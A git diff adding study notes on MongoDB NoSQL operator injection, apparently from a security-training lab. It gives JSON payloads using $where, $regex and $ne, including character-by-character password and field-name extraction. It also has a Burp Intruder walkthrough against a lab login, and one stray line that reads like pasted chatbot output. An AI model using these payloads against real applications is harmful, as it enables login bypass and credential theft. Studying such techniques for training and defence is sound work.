@@ -405,4 +405,119 @@ Sort by _Payload 1_ lowest to highest and then _Length_ highest to lowest. Event
 
 > NOTE: Check out [walkthrough](nosql_lab03_zaproxy.md) of this lab's __brute-force section__ in OWASP Zed Attack Proxy 
 
+## Exploiting NoSQL operator injection to extract data
 
+Even if the application's original query doesn't include operators that allow arbitrary JavaScript execution, you might still be able to inject such an operator yourself. By using boolean conditions, you can test whether the application runs any JavaScript you include through the injected operator.
+
+### Injecting operators in MongoDB
+
+Suppose a vulnerable application accepts a username and password in a `POST` request body like this:
+
+```json
+{"username":"wiener","password":"peter"}
+```
+
+To check for operator injection, you can try adding the `$where` operator and sending two versions --- one where the condition is false and another where it's true:
+
+```json
+{"username":"wiener","password":"peter","$where":"0"}
+```
+
+And
+
+```json
+{"username":"wiener","password":"peter","$where":"1"}
+```
+
+If the server responds differently to each request, it suggests that the JavaScript code in the `$where` clause is being executed.
+
+### Extracting field names
+
+If you've successfully injected an operator that allows JavaScript execution, you can potentially use the `keys()` method to reveal field names. For instance, using a payload like:
+
+```json
+"$where":"Object.keys(this)[0].match('^.{0}a.*')"
+```
+
+This checks whether the first character of the first field name matches `a`. This technique lets you gradually uncover the full name of a field one character at a time. 
+
+### Exfiltrating data using operators
+
+Another way to extract information is by using query operators that don't allow arbitrary JavaScript execution --- such as `$regex`. This operator can still be exploited to reveal data one character at a time. 
+
+For example, in a vulnerable application that accepts a JSON `POST` request like:
+
+```json
+{"username":"myuser","password":"mypass"}
+```
+
+You might test whether `$regex` is interpreted by submitting:
+
+```json
+{"username":"admin","password":{"$regex":"^.*"}}
+```
+
+If the server responds differently compared to a clearly incorrect password, it suggests the regex is being evaluated, meaning the input is vulnerable. 
+
+From there, you can test character-by-character matches. For instance, this payload checks if the admin's password starts with the letter `a`:
+
+```json
+{"username":"admin","password":{"$regex":"^a*"}}
+```
+
+By adjusting the regex patterns incrementally, you can enumerate the password or other sensitive fields. Would you like help building a loop to automate this extraction?
+
+### Lab: Exploiting NoSQL operator injection to extract unknown fields
+
+In Burp's browser, try to log in as `carlos:invalid`. In Proxy history, you can see `POST /login` request with body:
+
+```json
+{"username":"carlos","password":"invalid"}
+```
+
+Send it to __Repeater__. As a value to `"password"` parameter, add `{"$ne":"invalid"}` instead of `"invalid"` and send the request with the following body:
+
+```json
+{"username":"carlos","password":{"$ne":"invalid"}}
+```
+
+You should receive the following message in the response:
+
+```html
+<p class=is-warning>Account locked: please reset your password</p>
+```
+
+This response indicates that `$ne` operator has been accepted and the application is vulnerable.
+
+In Burp's browser, click "Forgot password?", enter `carlos` and submit to reset password. When you submit the `carlos` username, observe that the reset mechanism involves email verification, so you can't reset the account yourself. 
+
+Back in Repeater test the `POST /login` request for a JavaScript injection. put a comma after `"password"` parameter value in the request body and add a new parameter: `"$where": "0"` and send the request with the following body:
+
+```json
+{"username":"carlos","password":{"$ne":"invalid"},"$where": "0"}
+```
+
+Response should have the following message:
+
+```html
+<p class=is-warning>Invalid username or password</p>
+```
+
+Change `"$where"` value from `"0"` to `"1"` and resend the request. 
+
+It's this again:
+
+```html
+<p class=is-warning>Account locked: please reset your password</p>
+```
+
+This means that the JavaScript in the `$where` clause is being evaluated (on account of `"0"` and `"1"` returning different responses. 
+
+Right-click this request and send it to __Intruder__. Update the `$where` parameter as follows: `"$where":"Object.keys(this)[1].match('^.{}.*')"`. Select __Cluster bomb attack__ from the drop-down menu and add payloads in the following places: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`.
+
+In the Payloads side panel, select position 1 from the Payload position drop-down list, then set the Payload type to Numbers. Set the number range, for example from 0 to 20. Select position 2 from the Payload position drop-down list and make sure the Payload type is set to Simple list. Add all numbers, lower-case letters and upper-case letters as payloads.
+
+For the first parameter, the __Intruder__ spelt out `username`. Now let's rerun this attack with this query: `"$where":"Object.keys(this)[2].match('^.{§§}§§.*')"`--
+
+> OKAY. There's no way I'm waiting this long for this thing to complete. Community edition's __Intruder__ is basically garbage. 
+> Check out [walkthrough](nosql_lab04_zaproxy.md) of __brute-force to identify all fields on the user object__ using OWASP Zed Attack Proxy's Fuzzer (and no __Cluster Bomb__ and other fancy names either, just a good old Fuzzer with three simultaneous payloads).
